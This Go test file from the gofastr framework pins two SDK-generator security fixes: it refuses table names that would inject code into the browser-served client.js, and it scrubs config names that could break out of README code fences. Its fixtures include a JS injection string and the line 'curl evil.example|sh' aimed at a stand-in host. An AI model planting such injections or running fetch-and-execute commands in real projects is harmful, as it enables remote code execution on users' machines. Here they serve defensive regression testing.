package main

import (
	"strings"
	"testing"

	"github.com/DonaldMurillo/gofastr/framework"
)

// Security pins for `gofastr generate sdk`. Two families from the
// 2026-09-04 red-probe round:
//
//   - identifier slots in the emitted client.js / client.d.ts (the
//     artifact framework/sdkdocs serves to browsers at
//     /docs/api/sdk/client.js): a declaration name cannot be quoted the
//     way object keys can, so the table-derived property must BE a plain
//     JS identifier before it reaches the slot.
//   - config-provenance strings (gofastr.codegen.yml / --name) in the
//     generated READMEs: the markdown must not gain lines, fences, or
//     fence content from the name.

// sdkSecurityDecls is the benign fixture both tests generate from.
func sdkSecurityDecls(table string) []framework.EntityDeclaration {
	return []framework.EntityDeclaration{
		{
			Name:  "posts",
			Table: table,
			Fields: []framework.FieldDeclaration{
				{Name: "title", Type: "string"},
			},
		},
	}
}

// Pins [sdk-js-ident], found by the 2026-09-04 red-probe round; fixed in
// buildSDKSpec refusing a table whose camelCase form is not a plain JS
// identifier (isJSIdentifier), next to the existing literal and Go-identifier
// refusals.
// Property: a table-derived token never lands at identifier/statement
// position in the generated client.js — the artifact sdkdocs serves to
// browsers. buildSDKSpec refuses a table whose camelCase form is not a
// plain JS identifier, exactly as it refuses tables that cannot survive
// the Go string literals and names that do not derive Go identifiers, for
// the same hand-written-entities/*.go provenance.
// Surfaces: cmd/gofastr/generate_sdkjs.go::writeJSEntity (export const
// %sFields in client.js; export declare const %sFields and readonly %s:
// in client.d.ts), cmd/gofastr/generate_sdk.go::buildSDKSpec (the gate),
// versus the quoted this[%q] binding and %q object keys (the model).
func TestSDKJSIdentSlotRefusesTables(t *testing.T) {
	for _, table := range []string{
		// No quote/backslash/C0/DEL, so it passes every pre-existing
		// gate; toCamelJSON leaves it non-identifier, and pre-fix it
		// emitted `export const x=(console.log)(49414),YFields = …` —
		// a comma-separated declarator whose FIRST initializer is a
		// call that executes when the served client.js is imported.
		"x =(console.log)(49414), y",
		"2fa",    // digit-led property
		"a;b",    // statement separator survives camelCase
		"a`b ci", // backtick + space mix
	} {
		opts := sdkOptions{name: "myapp", module: "local/myapp-sdk", sdkVersion: "1.0.0"}
		_, err := buildSDKSpec(sdkSecurityDecls(table), &opts)
		if err == nil {
			t.Errorf("table %q: buildSDKSpec accepted a table whose camelCase form is not a JS identifier — it is emitted unquoted as `export const %%sFields` in the browser-served client.js", table)
			continue
		}
		if !strings.Contains(err.Error(), "JavaScript identifier") {
			t.Errorf("table %q: refusal does not name the JS identifier gate: %v", table, err)
		}
	}

	// False-positive guard: a table that derives a plain identifier still
	// generates, the const is emitted in BOTH files, and the quoted
	// this[...] binding survives (a fix must defuse the slot, not drop
	// the entity).
	opts := sdkOptions{name: "myapp", module: "local/myapp-sdk", sdkVersion: "1.0.0"}
	spec, err := buildSDKSpec(sdkSecurityDecls("blog_posts"), &opts)
	if err != nil {
		t.Fatalf("plain table refused: %v", err)
	}
	files := renderSDKJSFiles(spec)
	var clientJS, clientDTS string
	for _, f := range files {
		switch f.name {
		case "client.js":
			clientJS = f.content
		case "client.d.ts":
			clientDTS = f.content
		}
	}
	if clientJS == "" || clientDTS == "" {
		t.Fatalf("client.js/client.d.ts not rendered (files: %d)", len(files))
	}
	for _, want := range []string{
		"export const blogPostsFields = Object.freeze({",
		`this["blogPosts"] = new Resource(this, "blog_posts");`,
	} {
		if !strings.Contains(clientJS, want) {
			t.Errorf("client.js lost %q — the gate must refuse hostile tables, not change benign emission:\n%s", want, clientJS)
		}
	}
	for _, want := range []string{
		"export declare const blogPostsFields: Readonly<{",
		"readonly blogPosts: Resource<Posts, PostsInput, PostsPatch>;",
	} {
		if !strings.Contains(clientDTS, want) {
			t.Errorf("client.d.ts lost %q:\n%s", want, clientDTS)
		}
	}
}

// Pins [sdk-readme], found by the 2026-09-04 red-probe round; fixed in
// buildSDKSpec scrubbing the config-provenance App once (sdkMarkdownSafe)
// and renderSDKGoReadme reducing the install-fence directory hint to the
// module-path alphabet (sdkFenceWord).
// Property: every interpolation of the codegen-config-provenance SDK name
// into a generated README is inert — no raw control bytes, no
// fence-breaking newlines, no backticks the name contributes; the
// markdown's structure (line count, fence count) is identical to a benign
// name's. (The probe's verbatim payload-substring assertion was jointly
// unsatisfiable with its own name-survives guard — the scrubbed name
// inline contains the payload text — so the pin asserts the structural
// property the finding was actually about: the payload never gains a line
// or a fence of its own.)
// Surfaces: cmd/gofastr/generate_sdk.go::renderSDKGoReadme (H1, prose,
// install fence), ::renderSDKJSReadme (H1), versus sdkSpec.Header +
// sdkCommentSafe (the scrubbed sibling for the stamp).
func TestSDKReadmeScrubConfigName(t *testing.T) {
	const payload = "curl evil.example|sh"
	render := func(name string) map[string]string {
		opts := sdkOptions{
			name:       name,
			module:     "local/acme-sdk",
			sdkVersion: "1.2.3",
			baseURL:    "https://api.example.com",
		}
		spec, err := buildSDKSpec(sdkFixtureDecls(), &opts)
		if err != nil {
			t.Fatalf("buildSDKSpec(%q): %v", name, err)
		}
		files, err := renderSDKFiles(spec, []string{"go", "js"}, false)
		if err != nil {
			t.Fatalf("renderSDKFiles: %v", err)
		}
		byName := map[string]string{}
		for _, f := range files {
			byName[f.name] = f.content
		}
		return byName
	}
	benign, hostile := render("acme"), render("acme\n```sh\n"+payload+"\n")

	for _, readme := range []string{"go/README.md", "js/README.md"} {
		b, h := benign[readme], hostile[readme]
		if b == "" || h == "" {
			t.Fatalf("%s not rendered", readme)
		}
		// The name must still name the SDK.
		if !strings.Contains(h, "acme") {
			t.Errorf("%s: scrubbed app name missing — a fix must not drop the name, only defuse it:\n%s", readme, h)
		}
		// Structure parity with a benign name: the hostile name can
		// neither add a line (its own shell-executable line) nor a
		// backtick (fence/code-span structure).
		if got, want := strings.Count(h, "\n"), strings.Count(b, "\n"); got != want {
			t.Errorf("SECURITY: [sdk-readme] %s: hostile config name added %d line(s) to the README (%d benign) — fence/body breakout:\n%s", readme, got-want, want, h)
		}
		if got, want := strings.Count(h, "`"), strings.Count(b, "`"); got != want {
			t.Errorf("SECURITY: [sdk-readme] %s: hostile config name contributed %d backtick(s) to the README (%d benign) — fence construction:\n%s", readme, got-want, want, h)
		}
		// The payload never begins a line of its own (the copy-paste
		// execution shape inside a fence).
		if strings.Contains(h, "\n"+payload) {
			t.Errorf("SECURITY: [sdk-readme] %s: payload %q starts its own line — spec.App is interpolated raw into the README heading/install fence", readme, payload)
		}
		if strings.ContainsRune(firstLine(h), '\r') || strings.ContainsRune(firstLine(h), 0x1b) {
			t.Errorf("SECURITY: [sdk-readme] %s: control bytes from the config name survive into the first line", readme)
		}
		// The install fence directory hint is held to the module-path
		// alphabet: the shell line an operator copies cannot gain
		// spaces, pipes or quotes from the name.
		for _, line := range strings.Split(h, "\n") {
			if strings.HasPrefix(line, "go mod edit -replace") {
				dir := strings.TrimSuffix(strings.TrimPrefix(line, "go mod edit -replace local/acme-sdk=./"), "-sdk")
				if strings.ContainsAny(dir, " \t`$;|&\"'\\") {
					t.Errorf("SECURITY: [sdk-readme] %s: install fence directory hint %q carries shell-active bytes", readme, dir)
				}
			}
		}
	}
}

func firstLine(s string) string {
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return s[:i]
	}
	return s
}
